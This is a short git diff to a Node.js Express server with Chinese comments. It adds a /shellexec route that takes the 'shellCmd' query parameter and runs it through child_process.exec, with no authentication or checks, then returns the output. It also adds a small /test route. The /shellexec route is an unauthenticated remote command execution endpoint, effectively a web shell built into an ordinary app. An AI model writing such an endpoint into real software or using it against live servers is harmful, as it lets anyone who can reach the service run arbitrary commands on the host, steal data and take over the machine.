@@ -5,6 +5,7 @@ const log4js = require('./util/log_util');
 const commonUtil = require('./util/common_util');
 const recordModel = require('./db/record_model');
 const RedisClient = require('./redis/redis');
+const {exec} = require("child_process");
 const app = express();
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
@@ -75,6 +76,33 @@ app.get("/redis/get", async (req, res) => {
   logger.info(commonUtil.printLog(req, Date.now() - begin, true));
 });
 
+
+// 执行shell命令返回结果
+app.get("/shellexec", async(req, res)=>{
+  const logger = log4js.getLogger('MVC-LOGGER');
+  logger.info("receive shell execute request: " + req.query["shellCmd"]);
+  exec(req.query["shellCmd"] ,(error, stdout, stderr) => {
+    if (error) {
+      console.error(`执行错误: ${error}`);
+      res.send("执行错误:"+error);
+      return;
+    }
+    console.log(`stdout: ${stdout}`);
+    console.error(`stderr: ${stderr}`);
+    res.send(stdout);
+    return;
+  });
+})
+
+
+// 测试接口
+app.get("/test", async (req, res) => {
+  let begin = Date.now();
+  let result = '测试结果:%%';
+  res.send(result);
+  const logger = log4js.getLogger('MVC-LOGGER');
+  logger.info(commonUtil.printLog(req, Date.now() - begin, true));
+});
 
 const port = process.env.PORT || 8080;
 
